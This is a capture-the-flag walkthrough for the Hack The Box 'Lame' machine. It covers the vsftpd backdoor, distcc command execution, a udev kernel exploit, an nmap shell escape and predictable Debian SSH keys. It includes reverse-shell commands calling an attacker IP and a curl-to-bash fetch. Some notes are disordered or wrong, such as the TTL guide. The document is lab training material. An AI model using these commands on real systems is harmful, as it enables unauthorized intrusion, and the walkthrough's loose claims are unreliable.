# HTB-lame
This will describe multiple ways to capture the root in the Hack the box lame machine, apart from the metasploit exploits this is a manual approach and more impactful at times as obviously manual attack are far more reliable than automated ones.

After purchase of VIP go to download VPN and then in kali
	1. Sudo openvpn --config filename.ovpn

Nmap -vvv -Pn -sCV --reason -T4 -p0-65535 -oN lame.nmap 10.10.10.3 
{Image attached}
TTL

	1. If 
		a. TTL 1-63  - LINUX machine
	2. If 
		a. TTL 64-128 - Windows Machine
	3. If 
		a. TTL >128 - Network device


vsftpd_234_backdoor.rb

Along with this 14. step create a listener 
nc -nvlp 443

	15. Python -c 'import pty; pty.spawn("/bin/bash")'  --- this help to import pty and pty helps to create/spawn a shell as we wrote /bin/bash
	16. Find / -iname user.txt --- / means the path and -iname means match the file name given in all the directory starting with /
	17. Find / -iname root.txt -exec wc {} \; --- execute word count on the file found with root.txt name
	18. Netstat -pantl | grep 6200 --- port 6200 is a tcp port used for vsftpd 2.3.4 backdoor 
	19. Try above command in all the users present and in the user you get "no info could be read"  Then that user session can help you get the backdoor
	20. Now in your terminal nc 10.10.10.3 21 USER bhavin:)
	PASS  bhavinand view with same netstat -pantl in user session you will see a listening port 6200 open
	21.  nc 127.0.0.1 6200 in user sesssion and you will see a backdoor createad
	22. And now spawn a shell with python ? How will you do it?
	23. Python -c "import pty; pty.spawn('/bin/bash')";
	24.  Check the log files for the blocked login in 6200 port
	25. Cat /var/log/messages | grep -i 6200
	26.  The system is using universal firewall as it block 6200 port

This is privilege escalation [Step 20]

Read nmap script and metasploit exploits related to the port of service you got open

Now done with port 21 and 139 
Go back to the recon tab and see what else you have I got the 3632 distcc 
	1. Search for a metasploit or nmap script for distcc and try executing it.
	2. Got nmap .nse script and now read the nse script nmap -p 3632 <ip> --script distcc-exec --script-args="distcc-exec.cmd='id'"The id is the arbitrary command execution in the machine
	3. Change Id with what you want
	4. So if I change id to nc -e /bin/bash 10.10.16.5 443 and simultaneously  open nc -nvlp 443 it will give the reverse shell 
	5. Check version of OS lsb_release -a
	6. Uname -a --- you get a 2.6.4 version
	7. Search for something related to it in searchsploit and nmap script
	8. Got 8572.c in searchsploit to mirror / copy in pwd searchsploit -m 8572.c
	9. Send this 8572 to victim by python -m server and wget http://ip:port/file.c 
	10. Use the gcc compiler to compile it
	11. And it is asking for udev PID ps -aux | grep udev
	12. and now it is asking for a run named payload Echo '#!/bin/bash' > runecho 'nc -e /bin/bash 10.10.16.5 1234'
	13. In your terminal nc -nvlp 1234
	14. Then run the ./a.out <PID>
	15. You can also try with PID-1 value

From ps -aux you got all the running services and service port 6667 is a unrealircd and you can 

Compare hash value to see if the file is corrupted or not
Md5sum filename --- at both places and it match > file ok
Sha1sum filename ---same
 

Linpeas.sh is
LinPEAS - Linux Privilege Escalation Awesome Script

To use this script sudo wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh   
Using the python server now send it to victim and if you directly run using the bash as it is a shell script 
Curl http://10.10.16.5:1234/linpeas.sh | bash

Now we see that nmap is running as root through linpeas
Go to gtfobin website to check for malicious ways to use any command and we will search for nmap as we get root permission in root

The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
nmap --interactive
nmap> !sh

This was a way to escalate privileges through nmap 

Open SSH

As we know we have openssh and we got authorized_key folder in the victim which is readable by all users so we can use predictable prng github to predict the public/ private key and try to ssh using it.
	1. Git clone https://github.com/g0tmi1k/debian-ssh.git
	2. In the folder created open it and goto common_keys and untar it using 
	3. sudo tar jxf debian_ssh_rsa_2048_x86.tar.bz2 
	4. You  got public and private key pair in the /rsa/2048 
	5. Now goto victim cat the key of authorized_key file
	6. Copy it and now sudo grep -lr <key you got>
	7. Now copy the public key and remove .pub and sudo ssh -i <public key> root@10.10.10.3
![image](https://github.com/bha-vin/HTB-lame/assets/103947819/d26ebea4-e7eb-464b-ad09-e963bee9b155)
